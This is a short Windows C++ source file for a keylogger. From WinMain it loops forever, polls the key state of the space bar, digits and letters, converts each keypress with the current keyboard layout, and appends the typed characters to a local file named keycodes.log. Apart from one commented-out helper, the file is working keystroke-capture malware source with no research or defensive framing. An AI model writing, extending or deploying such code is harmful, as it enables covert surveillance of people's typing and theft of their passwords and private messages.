#include <iostream>
#include <locale>
#include <cctype>
#include <string>
#include <fstream>
#include <stdio.h>
#include <windows.h>
#include <WinUser.h>
#define VK_CAPITAL 0x14

using namespace std;

/*
ofstream CreateLog(string dirFile, string nameFile)
{
	string path = dirFile + nameFile;
	ofstream logFile(path);
	return logFile;
}
*/

void StartWrite(BYTE listVKey[], const int keyList, int symCount, int symLimit, HKL keyLayout)
{
	wofstream logFile;
	locale loc("");

	logFile.open("keycodes.log", wofstream::app);
		if (logFile.is_open())
		{

			int pressCount = 0;
			for (int i = 0; i < keyList; i++)
			{

				if ((GetAsyncKeyState(listVKey[i])) && (pressCount == 0))
				{
					pressCount = 1;
					symCount++;

					UINT symbol = (UINT)listVKey[i];
					WCHAR buff = NULL;
					LPWSTR pwszBuff = &buff;
					ToUnicodeEx(symbol, listVKey[i], listVKey, pwszBuff, 1, 0, keyLayout);
					logFile.imbue(loc);
					if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
					{
						logFile << *pwszBuff;

						if (symCount == symLimit)
						{
							logFile << endl;
							symCount = 0;
						}
					}
					else
					{
						logFile << *pwszBuff;

						if (symCount == symLimit)
						{
							logFile << endl;
							symCount = 0;
						}
					}

					Sleep(100);
					break;
				}
				else if (GetAsyncKeyState(listVKey[i]) == 0) pressCount = 0;
			}
		}
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, INT nCmdShow)
{
	bool running = true;
	const int keyList = 37;
	int symLimit = 100;
	int symCount = 0;
	BYTE arrVKey[keyList] = { 0x20,0x30,0x31,0x32,0x33,0x34,0x35,0x36,0x37,0x38,0x39,0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48,0x49,0x4A,0x4B,0x4C,0x4D,0x4E,0x4F,0x50,0x51,0x52,0x53,0x54,0x55,0x56,0x57,0x58,0x59,0x5A };
	int* psLimit = &symLimit;
	int* psCount = &symCount;

	while (true)
	{
		HKL keyLayout = GetKeyboardLayout(NULL);
		StartWrite(arrVKey, keyList, *psCount, *psLimit, keyLayout);
	}
}
